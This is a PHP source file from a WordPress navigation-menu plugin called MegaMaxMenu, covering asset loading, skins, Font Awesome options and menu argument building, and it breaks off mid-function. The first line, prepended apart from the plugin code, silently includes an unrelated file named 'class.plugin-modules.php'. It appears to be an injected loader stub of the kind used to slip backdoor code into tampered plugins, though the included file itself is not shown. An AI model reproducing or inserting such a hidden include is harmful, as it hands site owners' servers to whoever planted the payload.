<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

add_action( 'plugins_loaded' , 'megamaxmenu_load_gutenberg_block' );
function megamaxmenu_load_gutenberg_block(){
	if( function_exists( 'register_block_type' ) ){
		include_once( 'gutenberg/gutenberg.php' );
	}
}

add_action( 'plugins_loaded' , 'megamaxmenu_load_textdomain' );
function megamaxmenu_load_textdomain(){
	load_plugin_textdomain( 'megamaxmenu' , false , MEGAMAXMENU_BASEDIR.'/languages' );
}


add_filter( 'wp' , 'megamaxmenu_wp_actions' );
function megamaxmenu_wp_actions(){

	//Exclude MegaMaxMenu Advanced Items from other menus
	if( megamaxmenu_op( 'exclude_advanced_megamaxmenu_items' , 'general' ) === 'on' ){
		add_filter( 'wp_nav_menu_objects' , 'megamaxmenu_exclude_advanced_items' , 20, 2 );
	}

}


function megamaxmenu_enqueue_style( $handle , $src = '', $deps = array() , $ver = false , $media = 'all' ){
	_MEGAMAXMENU()->load_stylesheet( $handle , $src , $deps , $ver , $media );
}
function megamaxmenu_enqueue_script( $handle , $src = '', $deps = array() , $ver = false , $in_footer = false ){
	_MEGAMAXMENU()->load_script( $handle , $src , $deps , $ver , $in_footer );
}

function megamaxmenu_load_assets(){

	$assets = MEGAMAXMENU_URL . 'assets/';

	//Load Core MegaMaxMenu CSS unless disabled
	if( megamaxmenu_op( 'load_megamaxmenu_css' , 'general' ) != 'off' ){
		wp_register_style( 'megamaxmenu' , $assets.'css/megamaxmenu.min.css' , false , MEGAMAXMENU_VERSION );

		//wp_enqueue_style( 'megamaxmenu' );
		megamaxmenu_enqueue_style( 'megamaxmenu' );
	}

	//Load Required Skins
	$instances = megamaxmenu_get_menu_instances( true );
	foreach( $instances as $instance ){
		$skin = megamaxmenu_op( 'skin' , $instance );
		megamaxmenu_enqueue_skin( $skin );
	}

	//
	//Font Awesome
	//

	//Font Awesome CSSFonts
	$load_fa_solid = 				megamaxmenu_op( 'load_fontawesome_fontcss_solid' , 'general' ) !== 'off';
	$load_fa_brands = 			megamaxmenu_op( 'load_fontawesome_fontcss_brands' , 'general' ) !== 'off';
	$load_fa_regular = 			megamaxmenu_op( 'load_fontawesome_fontcss_regular' , 'general' ) !== 'off';
	$load_fa_core = 				$load_fa_solid || $load_fa_brands || $load_fa_regular;
	$load_fa_all = 					$load_fa_solid && $load_fa_brands && $load_fa_regular;


	if( $load_fa_all )				megamaxmenu_enqueue_style( 'megamaxmenu-font-awesome-all' , 	MEGAMAXMENU_URL .'assets/fontawesome/css/all.min.css' , false , false );
	else{
		if( $load_fa_core ) 		megamaxmenu_enqueue_style( 'megamaxmenu-font-awesome-core' , 	MEGAMAXMENU_URL .'assets/fontawesome/css/fontawesome.min.css' , false , false );
		if( $load_fa_solid ) 		megamaxmenu_enqueue_style( 'megamaxmenu-font-awesome-solid' , MEGAMAXMENU_URL .'assets/fontawesome/css/solid.min.css' , false , false );
		if( $load_fa_brands ) 	megamaxmenu_enqueue_style( 'megamaxmenu-font-awesome-brands' , MEGAMAXMENU_URL .'assets/fontawesome/css/brands.min.css' , false , false );
		if( $load_fa_regular ) 	megamaxmenu_enqueue_style( 'megamaxmenu-font-awesome-regular' , MEGAMAXMENU_URL .'assets/fontawesome/css/regular.min.css' , false , false );
	}

	//Font Awesome SVG
	$load_fasvg_solid = 		megamaxmenu_op( 'load_fontawesome_svg_solid' , 'general' ) !== 'off';
	$load_fasvg_brands = 		megamaxmenu_op( 'load_fontawesome_svg_brands' , 'general' ) !== 'off';
	$load_fasvg_regular = 	megamaxmenu_op( 'load_fontawesome_svg_regular' , 'general' ) !== 'off';
	$load_fasvg_core = 			$load_fasvg_solid || $load_fasvg_brands || $load_fasvg_regular;
	$load_fasvg_all = 			$load_fasvg_solid && $load_fasvg_brands && $load_fasvg_regular;

	if( $load_fasvg_all )		megamaxmenu_enqueue_script( 'megamaxmenu-font-awesome-js-all' , MEGAMAXMENU_URL.'assets/fontawesome/js/all.min.js' , false , false , false );
	else{
		if( $load_fasvg_solid ) 	megamaxmenu_enqueue_script( 'megamaxmenu-font-awesome-js-solid' , MEGAMAXMENU_URL.'assets/fontawesome/js/solid.min.js' , false , false , false );
		if( $load_fasvg_brands ) 	megamaxmenu_enqueue_script( 'megamaxmenu-font-awesome-js-brands' , MEGAMAXMENU_URL.'assets/fontawesome/js/brands.min.js' , false , false , false );
		if( $load_fasvg_regular ) megamaxmenu_enqueue_script( 'megamaxmenu-font-awesome-js-regular' , MEGAMAXMENU_URL.'assets/fontawesome/js/regular.min.js' , false , false , false );
		//Core needs to be loaded last
		if( $load_fasvg_core ) 		megamaxmenu_enqueue_script( 'megamaxmenu-font-awesome-js-core' , MEGAMAXMENU_URL.'assets/fontawesome/js/fontawesome.min.js' , false , false , false );
	}

	//Font Awesome 4 shim
	if( megamaxmenu_op( 'load_fontawesome4_shim' , 'general' ) == 'on' ){
		//wp_enqueue_script( 'megamaxmenu-font-awesome4-shim' , MEGAMAXMENU_URL.'assets/fontawesome/svg/js/fa-v4-shims.min.js' , false , false , false );
		megamaxmenu_enqueue_script( 'megamaxmenu-font-awesome4-shim' , MEGAMAXMENU_URL.'assets/fontawesome/js/v4-shims.min.js' , false , false , false );
	}
	add_filter( 'script_loader_tag', 'megamaxmenu_fontawesome_defer', 10, 2 );


	// if( megamaxmenu_op( 'load_fontawesome' , 'general' ) != 'off' ){
	// 	//font awesome 4
	// 	//wp_enqueue_style( 'megamaxmenu-font-awesome' , $assets.'css/fontawesome/css/font-awesome.min.css' , false , '4.3' );
	//
	// 	//wp_enqueue_style( 'megamaxmenu-font-awesome' , 'https://use.fontawesome.com/releases/v5.0.7/css/all.css' , false );
	//
	// 	//font awesome 5
	// 	//wp_enqueue_style( 'megamaxmenu-font-awesome' , 'https://use.fontawesome.com/releases/v5.0.7/css/all.css' , false );
	// 	wp_enqueue_script( 'megamaxmenu-font-awesome-js' , MEGAMAXMENU_URL.'assets/fontawesome/svg/js/fontawesome-all.min.js' , false , false , false );
	// 	add_filter( 'script_loader_tag', 'megamaxmenu_fontawesome_defer', 10, 2 );

	// }




	//Custom Stylesheet
	if( megamaxmenu_op( 'load_custom_css' , 'general' ) == 'on' ){
		megamaxmenu_enqueue_style( 'megamaxmenu-custom-stylesheet' , MEGAMAXMENU_URL.'custom/custom.css' , false , MEGAMAXMENU_VERSION );
	}



	//jQuery
	megamaxmenu_enqueue_script( 'jquery' );

	//Google Maps
	if( megamaxmenu_op( 'load_google_maps' , 'general' ) == 'on' ){
		//Google Maps API
    $gmaps_uri = '//maps.googleapis.com/maps/api/js';

    $query_params = array();

    //API Key
    $api_key = trim( megamaxmenu_op( 'google_maps_api_key' , 'general' ) );
    if( $api_key ){
      $query_params['key'] = $api_key;
    }

    //Language
    $language = trim( megamaxmenu_op( 'google_maps_language' , 'general' ) );
    if( $language ){
      $query_params['language'] = $language;
    }

    //Region
    $region = trim( megamaxmenu_op( 'google_maps_region' , 'general' ) );
    if( $region ){
      $query_params['region'] = $region;
    }

    $query = http_build_query( $query_params );

    $gmaps_uri.= '?'.$query;

    megamaxmenu_enqueue_script( 'google-maps', $gmaps_uri , array( 'jquery' ), null , true );
	}

	//MegaMaxMenu JS
	if( SCRIPT_DEBUG ){
		megamaxmenu_enqueue_script( 'megamaxmenu' , $assets.'js/megamaxmenu.js' , array( 'jquery' ) , MEGAMAXMENU_VERSION , MEGAMAXMENU_JS_IN_FOOTER );
	}
	else{
		megamaxmenu_enqueue_script( 'megamaxmenu' , $assets.'js/megamaxmenu.min.js' , array( 'jquery' ) , MEGAMAXMENU_VERSION , MEGAMAXMENU_JS_IN_FOOTER );
	}

	$responsive_breakpoint = intval( megamaxmenu_op( 'responsive_breakpoint', 'general' ) );
	if( $responsive_breakpoint == 0 ) $responsive_breakpoint = 959;

	// $config_data = array();
	// $configs = megamaxmenu_get_menu_instances(true);
	// foreach( $configs as $config_id ){
	// 	$config_data[$config_id] = array(
	// 		//add data here
	// 	);
	// }

	$localized_data = array(
		'remove_conflicts'	=> megamaxmenu_op( 'remove_conflicts' , 'general' ),
		'reposition_on_load'=> megamaxmenu_op( 'reposition_on_load' , 'general' ),
		'intent_delay'		=> megamaxmenu_op( 'intent_delay' , 'general' ),
		'intent_interval'	=> megamaxmenu_op( 'intent_interval' , 'general' ),
		'intent_threshold'	=> megamaxmenu_op( 'intent_threshold' , 'general' ),
		'scrollto_offset'	=> megamaxmenu_op( 'scrollto_offset' , 'general' ),
		'scrollto_duration'	=> megamaxmenu_op( 'scrollto_duration' , 'general' ),
		'responsive_breakpoint' => $responsive_breakpoint,
		'accessible'		=> megamaxmenu_op( 'accessible', 'general' ),
		'retractor_display_strategy' => megamaxmenu_op( 'retractor_display_strategy' , 'general' ),
		'touch_off_close'	=> megamaxmenu_op( 'touch_off_close' , 'general' ),
		'submenu_indicator_close_mobile' => megamaxmenu_op( 'submenu_indicator_close_mobile' , 'general' ),
		'collapse_after_scroll'	=> megamaxmenu_op( 'collapse_after_scroll' , 'general' ),
		'v'					=> MEGAMAXMENU_VERSION,
		'configurations'	=> megamaxmenu_get_menu_instances(true),
		'ajax_url' 			=> admin_url( 'admin-ajax.php' ),
		'plugin_url'		=> MEGAMAXMENU_URL,
		'disable_mobile' 	=> megamaxmenu_op( 'disable_mobile' , 'main' ),	//just for troubleshooting
		'prefix_boost'	=> megamaxmenu_op( 'custom_prefix' , 'general' ),

		//accessibility
		'aria_role_navigation'	=> megamaxmenu_op( 'aria_role_navigation' , 'general' ),
		'aria_nav_label'	=> megamaxmenu_op( 'aria_nav_label' , 'general' ),
		'aria_expanded' => megamaxmenu_op( 'aria_expanded' , 'general' ),
		'aria_hidden'	=> megamaxmenu_op( 'aria_hidden' , 'general' ),
		'aria_controls' => megamaxmenu_op( 'aria_controls' , 'general' ),
		'aria_responsive_toggle' => megamaxmenu_op( 'aria_responsive_toggle' , 'general' ),
		'icon_tag' => megamaxmenu_op( 'icon_tag', 'main' ), // grab from main since no global

		//info
		'theme_locations' => get_registered_nav_menus(),

		//configs
		//'configs' => $config_data,
	);

	$localized_data = apply_filters( 'megamaxmenu_json_data' , $localized_data );

	wp_localize_script( 'megamaxmenu' , 'megamaxmenu_data' , $localized_data );

	//Custom JS
	if( megamaxmenu_op( 'load_custom_js' , 'general' ) == 'on' ){
		megamaxmenu_enqueue_script( 'megamaxmenu-custom' , MEGAMAXMENU_URL.'custom/custom.js' , array( 'jquery' ) , MEGAMAXMENU_VERSION , MEGAMAXMENU_JS_IN_FOOTER );
	}


	//wp_register_script( 'megamaxmenu-customizer' , $assets . 'admin/assets/customizer.js' , array( 'jquery' ) , MEGAMAXMENU_VERSION , true );
}
add_action( 'wp_enqueue_scripts' , 'megamaxmenu_load_assets' , 21 );


function megamaxmenu_fontawesome_defer( $tag, $handle ) {
    if( 'megamaxmenu-font-awesome-js-all' === $handle || 'megamaxmenu-font-awesome-js-solid' === $handle || 'megamaxmenu-font-awesome-js-brands' === $handle || 'megamaxmenu-font-awesome4-shim' === $handle ) {
        $tag = str_replace( ' src', ' defer src', $tag );
    }
    return $tag;
}

function megamaxmenu_inject_custom_css(){
	echo '<style id="megamaxmenu-custom-generated-css">';
	//echo megamaxmenu_generate_custom_styles();
	echo megamaxmenu_get_custom_styles();

	global $is_IE;
	if( $is_IE ){
		echo "\n@media \\0screen { .megamaxmenu .megamaxmenu-image { width: auto } } /* Prevent height distortion in IE8. */\n";
	}
	echo "\n</style>";
}
add_action( 'wp_head' , 'megamaxmenu_inject_custom_css' );


function megamaxmenu_get_skin_ops(){

	$registered_skins = _MEGAMAXMENU()->get_skins();
	if( !is_array( $registered_skins ) ) return array();
	$ops = array();
	foreach( $registered_skins as $id => $skin ){
		$ops[$id] = $skin['title'];
	}
	return $ops;

}
function megamaxmenu_register_skin( $id, $title, $path , $classes = '' ){
	_MEGAMAXMENU()->register_skin( $id , $title , $path , $classes );
}

add_action( 'init' , 'megamaxmenu_register_skins' );
function megamaxmenu_register_skins(){

	$main = MEGAMAXMENU_URL . 'assets/css/skins/';
	//Custom prefix booster
	if( megamaxmenu_op( 'custom_prefix' , 'general' ) ){
		$uploads_url = wp_upload_dir();
		$uploads_url = trailingslashit( $uploads_url['baseurl'] );
		$main = $uploads_url . 'megamaxmenu/';
	}

	megamaxmenu_register_skin( 'none' , 'None (Disabled - provide your own custom skin)' , '' );

	megamaxmenu_register_skin( 'minimal' , 'Minimal base (for customizing)' , $main.'minimal.css' );

	megamaxmenu_register_skin( 'grey-white' , 'Black &amp; White' , $main.'blackwhite.css' );
	megamaxmenu_register_skin( 'black-white-2' , 'Black &amp; White 2.0' , $main.'blackwhite2.css' , 'megamaxmenu-has-border' );
	megamaxmenu_register_skin( 'vanilla' , 'Vanilla' , $main.'vanilla.css' );
	megamaxmenu_register_skin( 'vanilla-bar' , 'Vanilla Bar' , $main.'vanilla_bar.css' , 'megamaxmenu-has-border' );

}


function megamaxmenu_enqueue_skin( $skin ){
	megamaxmenu_enqueue_style( 'megamaxmenu-'.$skin );
}


function megamaxmenu_init_actions(){
	add_action( 'megamaxmenu_register_icons' , 'megamaxmenu_register_default_icons' , 10 );
	do_action( 'megamaxmenu_register_icons' );
}
add_action( 'after_setup_theme' , 'megamaxmenu_init_actions' , 20 );

function megamaxmenu_setup_easy_integration(){
	if( megamaxmenu_op( 'megamaxmenu_theme_location' , 'general' ) == 'on' ){
		register_nav_menu( 'megamaxmenu' , 'MegaMaxMenu [Easy Integration]' );
	}
}
add_action( 'init' , 'megamaxmenu_setup_easy_integration' );


function megamaxmenu_get_menu_instances( $main = false ){
	$instances = get_option( MEGAMAXMENU_MENU_INSTANCES , array() );

	if( $main ){
		$instances[] = 'main';
	}

	return $instances;
}


function megamaxmenu_get_nav_menu_ops(){
	$menus = wp_get_nav_menus( array('orderby' => 'name') );
	$m = array( '_none' => 'Select Menu' );
	foreach( $menus as $menu ){
		$m[$menu->term_id] = $menu->name;
	}
	return $m;
}

function megamaxmenu_get_theme_location_ops(){
	$locs = get_registered_nav_menus();
	//$default = array( '_none' => 'Select Theme Location or use Menu Setting' );
	//$locs = array_unshift( $default, $locs );
	//$locs = $default + $locs;

	$menus = get_nav_menu_locations();
	foreach( $locs as $loc_id => $loc_name ){

		if( isset( $menus[$loc_id] ) && $menus[$loc_id] ){
			$locs[$loc_id].= ' <span class="megamaxmenu-assigned"><strong>' . wp_get_nav_menu_object( $menus[$loc_id] )->name .'</strong></span>';
		}
		else{
			$locs[$loc_id].= ' <span class="megamaxmenu-assigned megamaxmenu-assigned-none">No menu assigned</span>';
		}
	}

	return $locs;
}




/*
 * By Instance
 *
 * $integration_type - 'api' or 'auto'
 */
function megamaxmenu_get_nav_menu_args( $args , $integration_type , $config_id = 0 ){

	if( isset( $args['megamax_segment'] ) ) return $args; //Ignore segments

	$theme_location = '';
	$nav_menu_id = 0;
	$strict_mode = megamaxmenu_op( 'strict_mode' , 'general' ) == 'off' ? false : true;

	//Determine theme_location
	//Determine config_id (if not passed)
	//Determine nav_menu_id
	switch( $integration_type ){


		case 'auto':

			//Is it MegaMaxMenu?

			//Check for assigned Theme Location

			//For automatic integration, if there is no theme_location, we can't do anything
			if( $strict_mode && ( !isset( $args['theme_location'] ) || !$args['theme_location'] ) ){
				return $args;
			}

			//Determine Menu Instance ID by theme_location
			if( isset( $args['theme_location'] ) && $args['theme_location'] ){
				$theme_location = $args['theme_location'];
				$config_id = megamaxmenu_get_menu_instance_by_theme_location( $theme_location );
			}
			//[Non-strict mode] If there is no theme location at this point, we must have
			//strict mode disabled.  Therefore, default to Main instance
			else{
				$config_id = 'main';

				//However, in this case we require a 'menu' param to be passed
				if( isset( $args['menu'] ) && $args['menu'] ){
					$nav_menu_id = $args['menu'];
				}
				//If we don't have a theme location or menu parameter, the menu is indetermined
				else{
					$nav_menu_id = '_undetermined_';
				}
			}

			//If this theme location is not activated, ignore it
			if( !$config_id ) return $args;

			//Find nav_menu_id
			//look up the ID based on the theme location, assuming it exists

			if( $theme_location && has_nav_menu( $theme_location ) ){
				$menus = get_nav_menu_locations();
				$nav_menu_id = $menus[$theme_location];
			}

			//Check that we're on the right theme location instance
			if( $theme_location ){
				//Count this theme location instance
				_MEGAMAXMENU()->count_theme_location( $theme_location );

				//Determine what instance we're targeting
				$target_instance = megamaxmenu_op( 'theme_location_instance' , $config_id );
				if( is_numeric( $target_instance ) ){
					$target_instance = (int) $target_instance;
				}
				else if( $target_instance == '' ){
					$target_instance = 0;
				}
				else{
					megamaxmenu_admin_notice( __( 'Theme Location Instance should be an integer or leave blank.  Defaulting to 0.' , 'megamaxmenu' ) );
					$target_instance = 0;
				}

				//If we're not targeting all instances
				if( $target_instance > 0 ){

					//Check that the target theme location instance is the current theme location instance
					//If it isn't, then ignore
					if( $target_instance !== _MEGAMAXMENU()->get_theme_location_count( $theme_location ) ){
						return $args;
					}
				}

				//Ignore Mobile?
				if( megamaxmenu_op( 'disable_mobile' , $config_id ) == 'on' && megamaxmenu_is_mobile() ){
					return $args;
				}
			}

			break;


		case 'api':

			//instance_id
			if( $config_id != 'main' ){
				$instances = megamaxmenu_get_menu_instances();
				if( array_search( $config_id , $instances ) === false ){
					$notice = '<strong>'.$config_id.'</strong> '. __( 'is not a valid Configuration ID.  Please pass a valid Configuration ID to the megamaxmenu() function.' , 'megamaxmenu' );
					megamaxmenu_admin_notice( $notice );
				}
			}

			//Always MegaMaxMenu
			$theme_location = ( isset( $args['theme_location'] ) && $args['theme_location'] )
								? $args['theme_location'] : 0;


			//If a Menu ID was passed in the args, use that
			if( isset( $args['menu'] ) && $args['menu'] ){
				$nav_menu_id = $args['menu'];
			}
			//No Menu ID was passed, get the assigned menu based on the instance
			else{
				$_menu_id = megamaxmenu_op( 'nav_menu_id' , $config_id );

				if( $_menu_id  && $_menu_id != '_none' ){
					$nav_menu_id = $_menu_id;
				}
				else{
					//No menu passed, no menu assigned, try the theme location
					if( $theme_location && has_nav_menu( $theme_location ) ){
						$menus = get_nav_menu_locations();
						$nav_menu_id = $menus[$theme_location];
					}
				}

				//Setup args
				if( $nav_menu_id ){
					$args['menu'] = $nav_menu_id;	//TODO ...
				}
			}

			//Don't know what the nav menu ID is still
			if( !$nav_menu_id ){
				if( !$theme_location ) $args['theme_location'] = '__um_undetermined__';
			}

			//If a theme location was used, count it.  But we don't care if this is the target
			//or not, since the API was used
			if( $theme_location ){
				_MEGAMAXMENU()->count_theme_location( $theme_location );
			}

			break;

	}




	//Allow filtering to a different Configuration at this point
	$config_id = apply_filters( 'megamaxmenu_configuration_id' , $config_id , $args );


	//UL attributes - since we can't add anything to the nav tag
	$ul_atts = array();

	//Menu title is used for the aria-label on the nav tag, but this can be filtered
	$menu_title = apply_filters( 'megamaxmenu_menu_title' , wp_get_nav_menu_object( $nav_menu_id )->name , $nav_menu_id , $config_id , $args );
	$ul_atts['data-title'] = $menu_title;

	//Walk the array
	array_walk( $ul_atts , function( &$val , $att ) {
		//$ul_atts_str.= $att.'='.$val.' ';
		$val = "$att=\"$val\"";
	});
	//Combine the values
	$ul_atts_str = ' '.implode( ' ' , $ul_atts );	//beginning space is important

	//Basics
	$args['container_class'] 	= 'megamaxmenu megamaxmenu-nojs';
	$args['menu_class']			= 'megamaxmenu-nav';
	$args['walker']				= new MegaMaxMenuWalker;
	$args['megamax_instance']		= $config_id;
	$args['fallback_cb']		= 'megamaxmenu_fallback_cb';
	$args['depth']				= 0;
	$args['items_wrap']			= '<ul id="%1$s" class="%2$s"'.$ul_atts_str.'>%3$s</ul>';
	$args['link_before']		= '';
	$args['link_after']			= '';
	$args['megamax_integration_type'] = $integration_type;


	//Make sure nav menu ID is a string so that it can be used as part of the ID
	if( is_object( $nav_menu_id ) ){
		if( isset( $nav_menu_id->term_id ) ){
			$nav_menu_id = $nav_menu_id->term_id;
		}
		else{
			$nav_menu_id = '_bad_id_';
		}
	}

	//ID
	$args['container_id']		= 'megamaxmenu-'.$config_id.'-'.$nav_menu_id;
	if( $theme_location ){
		$args['container_id'].='-'.sanitize_key( $theme_location );
		$theme_location_count = _MEGAMAXMENU()->get_theme_location_count( $theme_location );
		if( $theme_location_count > 1 ){
			$args['container_id'].= '-'.$theme_location_count;
		}
	}


	//Inner ID
	if( !isset( $args['menu_id'] ) || !$args['menu_id'] || $integration_type == 'auto' ){
		$args['menu_id']		= 'megamaxmenu-nav-'.$config_id.'-'.$nav_menu_id;
		if( $theme_location ) $args['menu_id'].='-'.sanitize_key( $theme_location );
	}

	//Cache
	$args['menu_cache_key']		= "|megamax|$config_id|$nav_menu_id|$theme_location";	//For WP Menu Cache Plugin

	//Container
	$args['container']			= megamaxmenu_op( 'container_tag' , $config_id ); // . ' role="navigation"';

	//Menu Instance ID
	$args['container_class'].= ' megamaxmenu-'.$config_id;

	//Menu ID
	$args['container_class'].= ' megamaxmenu-menu-'.$nav_menu_id;

	//Theme Location
	if( $theme_location ){
		$args['container_class'].= ' megamaxmenu-loc-'.sanitize_title( $theme_location );
	}

	//Responsive
	if( megamaxmenu_op( 'responsive' , $config_id ) == 'on' ){
		$args['container_class'].= ' megamaxmenu-responsive';

		if( megamaxmenu_op( 'responsive_columns' , $config_id ) == 1 ){
			$args['container_class'].= ' megamaxmenu-responsive-single-column';
		}

		if( megamaxmenu_op( 'responsive_submenu_columns' , $config_id ) == 1 ){
			$args['container_class'].= ' megamaxmenu-responsive-single-column-subs';
		}

		$breakpoint = megamaxmenu_op( 'responsive_breakpoint' , 'general' );
		if( !$breakpoint ){
			$breakpoint = 'default';
		}
		else{
			$breakpoint = intval( $breakpoint );
		}
		$args['container_class'].= ' megamaxmenu-responsive-'.$breakpoint;
	}

	//Responsive no collapse
	if( megamaxmenu_op( 'responsive_collapse' , $config_id ) == 'off' ){
		$args['container_class'].= ' megamaxmenu-responsive-nocollapse';
	}
	else{
		$args['container_class'].= ' megamaxmenu-responsive-collapse';
	}

	//Orientation
	$orientation = megamaxmenu_op( 'orientation' , $config_id ) == 'vertical' ? 'vertical' : 'horizontal';
	$args['container_class'].= ' megamaxmenu-'.$orientation;

	//Transition
	$transition = megamaxmenu_op( 'transition' , $config_id );
	$args['container_class'].= ' megamaxmenu-transition-'.$transition;

	//Trigger
	$trigger = megamaxmenu_op( 'trigger' , $config_id );
	$args['container_class'].= ' megamaxmenu-trigger-'.$trigger;

	//Skin
	$skin = megamaxmenu_op( 'skin' , $config_id );
	$args['container_class'].= ' megamaxmenu-skin-'.$skin;
	$args['container_class'].= ' '._MEGAMAXMENU()->get_skin_classes( $skin );	//echo '[[['._MEGAMAXMENU()->get_skin_classes( $skin ).']]]';

	//Menu Bar Alignment
	$bar_align = megamaxmenu_op( 'bar_align' , $config_id );
	$args['container_class'].= ' megamaxmenu-bar-align-'.$bar_align;

	//Menu Item Alignment
	$items_align = megamaxmenu_op( 'items_align' , $config_id );
	$args['container_class'].= ' megamaxmenu-items-align-'.$items_align;

	//Menu Item Vertical Alignment
	// $items_align_vertical = megamaxmenu_op( 'items_align_vertical' , $config_id );
	// if( $items_align_vertical != 'bottom' ){
	// 	$args['container_class'].= ' megamaxmenu-items-align-'.$items_align_vertical;
	// }

	//Inner Menu Center
	if( megamaxmenu_op( 'bar_inner_center' , $config_id ) == 'on' ){
		$args['container_class'].= ' megamaxmenu-bar-inner-center';
	}

	//Submenu Bound
	if( megamaxmenu_op( 'bound_submenus' , $config_id ) == 'on' || megamaxmenu_op( 'orientation' , $config_id ) == 'vertical' ){
		$args['container_class'].= ' megamaxmenu-bound';
	}
	else if( megamaxmenu_op( 'bound_submenus' , $config_id ) == 'inner' ){
		$args['container_class'].= ' megamaxmenu-bound-inner';
	}

	//Submenu Scrolling
	if( $transition != 'slide' && megamaxmenu_op( 'submenu_scrolling' , $config_id ) != 'on' ){
		$args['container_class'].= ' megamaxmenu-disable-submenu-scroll';
	}


	//Force Current Submenus
	if( megamaxmenu_op( 'force_current_submenus' , $config_id ) == 'on' ){
		$args['container_class'].= ' megamaxmenu-force-current-submenu';
	}

	//Invert Submenus
	if( megamaxmenu_op( 'invert_submenus' , $config_id ) == 'on' ){
		$args['container_class'].= ' megamaxmenu-invert';
	}



	//Submenu Background Image Hiding
	if( megamaxmenu_op( 'submenu_background_image_reponsive_hide' , $config_id ) == 'on' ){
		$args['container_class'].= ' megamaxmenu-hide-bkgs';
	}

	//Responsive Collapse //responsive_collapse
	//$args['container_class'].= ' megamaxmenu-collapse';

	//Submenu Indicators
	if( megamaxmenu_op( 'display_submenu_indicators', $config_id ) == 'on' ){
		$args['container_class'].= ' megamaxmenu-sub-indicators';
	}

	//Submenu indicator alignment/position
	if( megamaxmenu_op( 'style_align_submenu_indicator' , $config_id ) == 'text' ){
		$args['container_class'].= ' megamaxmenu-sub-indicators-align-text';
	}

	//Retractors
	if( megamaxmenu_op( 'retractor_display_strategy' , 'general' ) == 'responsive' ){
		$args['container_class'].= ' megamaxmenu-retractors-responsive';
	}

	//Icon Display
	if( megamaxmenu_op( 'icon_display' , $config_id ) == 'inline' ){
		$args['container_class'].= ' megamaxmenu-icons-inline';
	}


	//Submenu indicator close button
	if( megamaxmenu_op( 'submenu_indicator_close_mobile' , 'general' ) !== 'off' ){
		$args['container_class'].= ' megamaxmenu-submenu-indicator-closes';
	}


	//Accessibility - handled in JS only now
	// if( megamaxmenu_op( 'accessible' , 'general' ) == 'on' ){
	// 	$args['container_class'].= ' megamaxmenu-accessible';
	// }

	//Don't allow class filtering
	if( megamaxmenu_op( 'disable_class_filtering' , 'general' ) == 'on' ) remove_all_filters( 'nav_menu_css_class' );

	//$args['container_class'].= ' megamaxmenu-pad-submenus';

	//Set the Current Instance for Reference
	_MEGAMAXMENU()->set_current_config( $config_id );

	return apply_filters( 'megamaxmenu_nav_menu_args' , $args , $config_id );
}

//add_filter( 'wp_nav_menu_container_allowedtags', 'megamaxmenu_allowed_nav_tags' );
function megamaxmenu_allowed_nav_tags( $tags ){
	$tags[] = 'nav role="navigation"';
	$tags[] = 'div role="navigation"';
	return $tags;
}

function megamaxmenu_fallback_cb( $args ){
	//up( $args );

	$notice = __( 'No menu to display.' , 'megamaxmenu' );

	if( isset( $args['theme_location'] ) ){
		$theme_location = $args['theme_location'];

		if( $theme_location == '__um_undetermined__' ){
			$instance = $args['megamax_instance'];
			$notice .= ' Please either <a target="_blank" href="'.admin_url('themes.php?page=megamaxmenu-settings#megamaxmenu_'.$instance ).'">assign a default menu to the <strong>'.$instance.'</strong> menu instance</a>, or pass it a Menu ID via the API';
		}
		else{
			$locs = get_registered_nav_menus();
			if( isset( $locs[$theme_location] ) ){
				$theme_loc_name = $locs[$theme_location];
				$notice = 'Please <a target="_blank" href="'.admin_url( 'nav-menus.php?action=locations' ).'">assign a menu</a> to the <strong>'.$theme_loc_name.'</strong> theme location.';
			}
		}
	}

	megamaxmenu_admin_notice( $notice );
}


function megamaxmenu_get_menu_instance_by_theme_location( $theme_location ){

	//Check Main
	$auto_theme_locations = megamaxmenu_op( 'auto_theme_location' , 'main' );
	if( is_array( $auto_theme_locations ) ){
		foreach( $auto_theme_locations as $loc ){
			if( $theme_location == $loc ){
				return 'main';
			}
		}
	}


	//Check Instances
	$instances = megamaxmenu_get_menu_instances();

	foreach( $instances as $config_id ){
		$auto_theme_locations = megamaxmenu_op( 'auto_theme_location' , $config_id );

		if( is_array( $auto_theme_locations ) ){
			foreach( $auto_theme_locations as $loc ){
				if( $theme_location == $loc ){
					return $config_id;
				}
			}
		}
	}

	return false;
}

function megamaxmenu_automatic_integration_filter( $args ){
	//Only do auto-integrate if this menu hasn't already been handled
	if( !isset( $args['megamax_integration_type'] ) ){
		$args = megamaxmenu_get_nav_menu_args( $args , 'auto' );
	}
	return $args;
}
add_filter( 'wp_nav_menu_args' , 'megamaxmenu_automatic_integration_filter' , 1000 );


function megamaxmenu_force_filter( $args ){

	if( megamaxmenu_op( 'force_filter' , 'general' ) == 'on' ){
		//For main MegaMaxMenus
		if( isset( $args['megamax_integration_type'] ) ){
			$args = megamaxmenu_get_nav_menu_args( $args , $args['megamax_integration_type'] , $args['megamax_instance'] );
		}
		//For menu segments, replace altered arguments with original array
		else if( isset( $args['megamax_segment'] ) ){
			if( isset( $args['megamax_segment_args'] ) ) $args = $args['megamax_segment_args'];
		}
	}
	return $args;
}
add_filter( 'wp_nav_menu_args' , 'megamaxmenu_force_filter' , 100000 );


function megamaxmenu_prevent_menu_item_class_filtering(){
	if( megamaxmenu_op( 'disable_class_filters' ) ){
		remove_all_filters( 'nav_menu_css_class' );
	}
}
//add_action( 'wp_head' , 'megamaxmenu_prevent_menu_item_class_filtering' );

function megamaxmenu_direct_injection_registration(){
	if( megamaxmenu_op( 'direct_inject' , 'main' ) == 'on' ){
		register_nav_menu( 'megamaxmenu-direct-inject' , __( 'MegaMaxMenu [Direct Injection]' , 'megamaxmenu' ) );
	}
}
add_action( 'init' , 'megamaxmenu_direct_injection_registration' );

function megamaxmenu_direct_injection(){
	if( megamaxmenu_op( 'direct_inject' , 'main' ) == 'on' ){
		if( has_nav_menu( 'megamaxmenu-direct-inject' ) ){
			megamaxmenu( 'main' , array( 'theme_location' => 'megamaxmenu-direct-inject' ) );
		}
		else{
			echo '<div class="megamaxmenu megamaxmenu-loc-megamaxmenu-direct-inject">';
			megamaxmenu_admin_notice( 'Please <a target="_blank" href="'.admin_url( 'nav-menus.php?action=locations' ).'">assign a menu</a> to the <strong>MegaMaxMenu [Direct Injection]</strong> theme location' );
			echo '</div>';
		}
	}
}
add_action( 'wp_footer' , 'megamaxmenu_direct_injection' );

function megamaxmenu_skipnav_filter( $nav_menu , $args ){
	//Add to MegaMaxMenu, ignore segments
